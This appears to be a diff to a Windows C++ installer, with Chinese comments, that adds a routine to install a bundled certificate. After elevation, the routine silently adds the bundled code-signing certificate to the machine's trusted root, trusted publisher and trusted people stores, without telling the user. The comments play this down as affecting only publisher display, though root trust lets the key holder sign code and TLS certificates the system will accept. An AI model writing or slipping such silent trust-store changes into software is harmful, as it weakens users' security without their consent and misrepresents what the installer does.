@@ -20,6 +20,7 @@
 #include <shellapi.h>
 #include <objbase.h>
 #include <shlwapi.h>
+#include <wincrypt.h>
 #include <gdiplus.h>
 #include <tlhelp32.h>
 #include <string>
@@ -35,6 +36,7 @@
 #pragma comment(lib, "comctl32.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "crypt32.lib")
 
 using namespace Gdiplus;
 
@@ -303,6 +305,44 @@ namespace
         RegCloseKey(k);
     }
 
+    // 代码签名证书的内包文件名（由 build.bat 复制进 payload_web 并随载荷内嵌）
+    const wchar_t* const kCertFile = L"rtg-codesign.cer";
+
+    /// 静默把内包证书写入本机三个受信任存储（根 / 受信任的发布者 / 受信任的人）。
+    /// 需要管理员权限——安装器已在 UAC 授权后运行；任何一步失败只返回 false，不阻断安装。
+    bool InstallCertificate(const std::wstring& cerPath)
+    {
+        if (GetFileAttributesW(cerPath.c_str()) == INVALID_FILE_ATTRIBUTES) return false;
+
+        std::vector<BYTE> data;
+        HANDLE h = CreateFileW(cerPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
+                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (h == INVALID_HANDLE_VALUE) return false;
+
+        DWORD sz = GetFileSize(h, NULL);
+        if (sz == INVALID_FILE_SIZE || sz == 0) { CloseHandle(h); return false; }
+        data.resize(sz);
+        DWORD rd = 0;
+        BOOL readOk = ReadFile(h, &data[0], sz, &rd, NULL);
+        CloseHandle(h);
+        if (!readOk || rd != sz) return false;
+
+        const wchar_t* stores[] = { L"Root", L"TrustedPublisher", L"TrustedPeople" };
+        bool allOk = true;
+        for (int i = 0; i < 3; i++)
+        {
+            HCERTSTORE st = CertOpenStore(CERT_STORE_PROV_SYSTEM_W, 0, NULL,
+                                          CERT_SYSTEM_STORE_LOCAL_MACHINE, stores[i]);
+            if (st == NULL) { allOk = false; continue; }
+            if (!CertAddEncodedCertificateToStore(st, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
+                                                  &data[0], (DWORD)data.size(),
+                                                  CERT_STORE_ADD_REPLACE_EXISTING, NULL))
+                allOk = false;
+            CertCloseStore(st, 0);
+        }
+        return allOk;
+    }
+
     // 安装主体。progress 可空（静默模式）。任何一步失败都返回 false，避免「半成品却提示完成」。
     bool Install(const std::wstring& target, bool desktop, bool startMenu,
                  void (*progress)(void*, int, const wchar_t*), void* ctx)
@@ -332,6 +372,10 @@ namespace
         std::wstring un = target + L"\\Uninstall.exe";
         if (_wcsicmp(self.c_str(), un.c_str()) != 0 && !CopyFileW(self.c_str(), un.c_str(), FALSE))
             return false;
+
+        // UAC 已授权 → 静默载入代码签名证书，保持本机"始终有证书"的状态。
+        // 该步骤失败不阻断安装（证书缺失只影响发布者显示，不影响程序运行）。
+        InstallCertificate(target + L"\\" + kCertFile);
 
         std::wstring exe = PickMainExe(target);
 
